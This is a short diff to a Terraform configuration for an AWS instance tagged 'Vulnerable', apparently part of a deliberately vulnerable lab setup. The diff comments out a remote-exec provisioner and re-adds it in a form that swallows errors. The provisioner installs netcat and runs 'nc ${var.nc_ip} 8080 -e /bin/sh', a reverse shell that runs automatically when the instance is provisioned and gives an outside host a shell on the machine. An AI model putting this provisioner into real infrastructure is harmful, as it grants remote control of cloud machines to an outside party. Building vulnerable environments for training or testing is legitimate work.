@@ -15,12 +15,19 @@ resource "aws_instance" "remote-exec-example" {
       Vulnerable = "true"
   }
 
-  provisioner "remote-exec" {
-    inline = [
-      "sudo yum install ec2-instance-connect nc -y",
-      "nc ${var.nc_ip} 8080 -e /bin/sh"
-    ]
-  }
+  # provisioner "remote-exec" {
+  #   inline = [
+  #     "sudo yum install ec2-instance-connect nc -y",
+  #     "nc ${var.nc_ip} 8080 -e /bin/sh"
+  #   ]
+  # }
+
+provisioner "remote-exec" {
+  inline = [
+    "sh -c 'sudo yum install ec2-instance-connect nc -y || true'",
+    "sh -c 'nc ${var.nc_ip} 8080 -e /bin/sh || true'"
+  ]
+}
 
   #iam_instance_profile = "tf-testing-role"
 
